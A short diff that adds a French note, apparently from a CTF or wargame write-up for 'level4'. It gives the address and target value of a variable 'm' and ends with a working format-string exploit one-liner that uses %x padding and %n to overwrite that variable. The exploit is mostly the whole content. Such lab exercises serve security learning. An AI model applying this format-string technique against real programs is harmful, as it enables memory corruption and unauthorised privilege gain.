@@ -1,0 +1,5 @@
+Ca a lair d être la meme sauf qu il faut aller plus loin dans les caractères
+0x08048492 <+59>:	cmp    $0x1025544,%eax
+0x8049810 m se trouve a cette adresse
+et m doit etre egal à 16930116
+(python -c 'print "\x10\x98\x04\x08" + " %x %x %x %x %x %x %x %x %x %x %16930040x %n"') | ./level4
